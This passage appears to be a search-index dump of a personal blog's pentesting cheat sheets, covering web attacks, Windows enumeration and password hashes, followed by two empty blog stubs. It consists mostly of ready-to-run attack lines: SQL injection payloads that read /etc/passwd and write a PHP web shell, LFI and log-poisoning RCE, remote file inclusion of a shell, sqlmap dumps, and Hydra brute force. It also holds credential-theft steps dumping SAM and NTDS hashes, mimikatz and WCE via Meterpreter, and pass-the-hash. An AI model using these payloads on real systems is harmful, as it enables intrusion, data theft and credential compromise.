1,2,3,4,load_file(\"/etc/passwd\")%23' Bypass Addslashes Send the string in char. 172.16.1.10/adm/test.php?loja='union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)'SQL Injection Error based 172.16.1.10/administration/test.php?test=sp'union select 1,2,3,4,5 %25' --Test until find the number of fields172.16.1.10/administration/test.php?test=sp'union select 1,2,version(),user(),database()' Blind SQL Injection When we dont have error response. Blind Post SQLi login=test' and length(database()) = 7 ' -- Will do request until to find the right lenght of database namelogin=test' and ascii(substring(database(),1,1)) = 100 #' -- Will check character of the name until find alllogin=test' and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema=\"dbtest\")#' -- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.Time based SQL Injection test=' or sleep(5)#' -- If sleep 6 sec is working the command. test=' or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#' -- If was right the comparison will sleep.SQL TO RCE 172.16.1.10/adm/test.php?ps='union all select 1,2,3,4,\"&lt;?php system($_GET['cmd']);?&gt;\" INTO OUTFILE \"/var/www/html/adm/banners/rce.php\" %23' 172.16.1.10/adm/banners/rce.php?cmd=ifconfigSqlMap sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" —current-db sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" —dbs sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" -D databasename —tables sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" -D databasename -T tablename —columns sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" -D databasename -C 'login,pass' —dump sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" —current-user sqlmap -u \"172.100.1.10/adm/test.php?ulp=sp\" —users sqlmap -u \"172.100.1.10/adm/test.php\" —forms XSS Cross Site Scripting Links:   BrutelogicReflect Self-XSS The script go to the page. Stored XSS When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc. Dom XSS Automation python3 xsstrike -u \"http://172.16.10.1/turismo/procurar.php?busca=\" # Test parameterspython3 xsstrike -u \"http://172.16.10.1/turismo/procurar.php\" # Find parameters in pagepython3 xsstrike -u \"http://172.16.10.1/turismo/procurar.php/\" —path # Search by self-xssLFI Local File Inclusion Application receive a parameter that execeute a command direct, without handling the input.   172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&gt; Read  172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&gt; Null byte bypass.LFI to RCE - Log infection 172.16.1.10/administration/info.php?p=/../../../../var/log/apache2/access.log # Read a log file. in this case the apche log.nc -v 172.16.1.10 80 -C &lt;?php system($_GET['p']); ?&gt; # Sending data to register in log172.16.1.10/administration/info.php?p=/../../../../var/log/apache2/access.log&amp;p=whereis nc # Execute the rce in log file.RFI  Remote File Inclusion It’s possible to include a remote file in system.   172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;p=idHTML Injection It’s possible inject a html in the page.   “172.16.1.10/administration/search.php?ps=&lt;h1&gt;Amazing link hacker&lt;/h1&gt;Path Traversal | Directory Traversal   172.16.1.10/administration/test.php?banners=/ -&gt; Will list all files inside the directory.  172.16.1.10/administration/test.php?banners=/../ -&gt; Will back one directory in path.Command injection commix --url http://172.16.1.10/hosting —data=\"site=whoami\" : Path disclosure When we can see the application path.   /var/www/html/adminstration/index.phpOpen redirect Is a redirect that allow to change the destination to our target.   www.test.com/redirect.php?url=http://attacker.comBrute force Hydra hydra -v -L users.txt -P pass.txt 172.16.1.10 http-post-form \"/adm/login.php:login=^USER^&amp;PASS=^PASS^&amp;Login:FAIL\"Source Code analisys PHP wrappers http://test.com/index.php?page=data://text/plan;base64,hash http://test.com/index.php?page=data://text/plan;&lt;?php system(id)?&gt;CMS Wordpress   wpvulndb.com: Vulnetabilities databasewpscan —url http://test.com/blog —api-token tokenJOOMLA joomscan -u http://172.100.0.106Webdav Is a set of extensions for the HTTP. cadaver http://172.16.1.10/webdav/ # Open a connection to execute commandsdavtest -url http://172.16.1.10/webdav/ # Upload files and execute it.XXE SSRF CSRF Template injection Subdomain Takeover ","categories": ["cheatsheet"],
        "tags": ["pentest","web","pentesting"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/web-pentesting.html"
      },{
        "title": "Windows",
        "excerpt":"Windows enumerate dir # List a directtoryecho text &gt; texts.txt # Save to afiletype example.txt # Print the filecommand /? # Program helpattrib +h file # Change attributsdir /a # Hide filesdir /S # Search by a filedir /X # Create alias to namesNetwork ipconfig /all # Show allnetstat -n # Active connectionsnetstat -ano # TCP and UDP open portsnet user nameuser # Show infonet user nameuser password /add # Add userarp -a # ARP tableroute print # Router informations(gateway, network segment...)Privilege escalation - whoami # Show user- whoami /groups # Show groups of the actual user- net user user # Show groups of the select user- net user # All users informations- hostname - systeminfo # Complete system informations (windows version, 64 or 32,...).- tasklist # - tasklist /SVC # Service associate to  process- sc query windefender # Antivírus is active?- netsh advfirewall show currentprofile # Show firewall- where /R c#\\ web.txt # Serach file recursively- findstr /s \"pass=\" *.txt # Searc by a string in a file","categories": ["cheatsheet"],
        "tags": ["pentest","os"],
        "url": "http://localhost:4000/cheatsheet/2022/01/13/windows.html"
      },{
        "title": "Hashes and basic criptography",
        "excerpt":"Examples echo -n \"teste\" | md5sum3b16dc694c38d04f7d7451cc37d3c654  -echo -n \"teste\" | sha256sum a0ec927b1044a5e945fbd9cf4370b4be1bc1ebc93bca51bc37f02a8814196bde  -md5sum teste.txt2dc6bdf12b1b886e5e2f3a72f4fb2293  teste.txtOne way x Two way       One way: Hash without reverse, only way to break is brute force         Two way: Base64 is a example is possible to do the reverse.   Hash lenght   md5: 32 characters  sha1: 40 characters  sha256: 64 characters  sha512: 128 charactersLinux Indentify hashes hash-identifier 3b16dc694c38d04f7d7451cc37d3c654Linux hashes Are in /etc/shadow.In this format: $id$salt$encrypted   id: Mehtod type: 1 = md5, 5 = sha256, 6 = sha512  salt: Random information to help to protect the hash.  encypted: Its the hash with salt.          kali:$y$j9T$GLYvBrczFiXmyft7hxEwX/$ev6ucG67u9pWBLvf7b1WoUTRQMXUDoK5gtuzUOQDU73:18819:0:99999:7::: : Use yescrypt($y$), derivate from originals functions.      Decrypt Worldlists   /usr/share/wordlists/rockyou.txt  /usr/share/john/password.lstJohn the ripper jonh hash jonh —format=Raw-MD5 —wordlist=rockyou.txtHashcat hashcat -m 100 hash /usr/share/john/password.lst —forceWindows SAM  -Security Account manager(Windows) : User accounts.   %SystemRoot%/system32/config/samNTDS.NIT(Windows server/Active directory) : Active directory include users..   %SystemRoot%/ntds/ntds.ditSYSTEM: System file, use do decrypt sam/ndts.dit   %systemroot%/system32/config/systemHash usser:id:LM(LAN MANAGER):NTLM(NT LAM MANAGER)   ids: 500-adm:501-guest, 1000:helpassistant,1005:user  LM: If begin with aa and finish ee (always equal), not used == empty.Old Windows reg save hklm\\sam samcopyreg save hklm\\system systemcopysamdump2 samcopy systemcopy # Show hashesimpacket-secretdump -sam samcopy -system systemcopy LOCAL # BetterModern/Active directory vssadmin create shadow /for=c:copy \"volumecreated\"\\windows\\ntds\\ntds.dit c:\\ntds.ditcopy \"volumecreated\"\\windows\\system32\\config\\ c:\\system1222impacket-secretdump -ntds ntds.dit -system system1222 LOCALIn cache Meterpreter upload /usr/share/windows-binaries/fgdump/fgdump.exe # Upload do victimfgdumpe.exe # Execute will create cachedump e pwdumpupload /usr/share/windows-resources/wce/wce-universal wce-universal.exe -w # Will get the passwordsload mimikatz # Meterpreter modulewdigest # Cache and morevssadmin create shadow /for=c:copy \"volumecreated\"\\windows\\ntds\\ntds.dit c:\\ntds.ditcopy \"volumecreated\"\\windows\\system32\\config\\ c:\\system1222impacket-secretdump -ntds ntds.dit -system system1222 LOCALJohn the ripper john —format=nt —wordlist=/usr/share/wordlists/rockyou.txt hashlist —show john —format=lm —wordlist=/usr/share/wordlists/rockyou.txt hashlist —show Pass the hash* It’s possible use the hash. pth-winexe -U john%\"hash\" //172.16.1.60 cmd.exeexploit/windows/smb/psexec #SMB pass the hash","categories": ["cheatsheet"],
        "tags": ["pentest","exploitation","hashes"],
        "url": "http://localhost:4000/cheatsheet/2022/01/14/hashes.html"
      },{
        "title": "Memory, part 1 - How the memory work",
        "excerpt":"This article is in development. ","categories": ["blog"],
        "tags": ["memory","neuroscience"],
        "url": "http://localhost:4000/blog/2022/04/21/memory-part1.html"
      },{
        "title": "Memory, part 2 - Using memory as a super power",
        "excerpt":"This article is in development. ","categories": ["blog"],
        "tags": ["memory","neuroscience"],
        "url": "http://localhost:4000/blog/2022/04/21/memory-part2.html"
      },{
        "title": "Subdomains",
        "excerpt":"Teste ","categories": ["cheatsheet"],
        "tags": ["pentest","methodologies"],
        "url": "http://localhost:4000/cheatsheet/2022/04/21/subdomains.html"
      }]
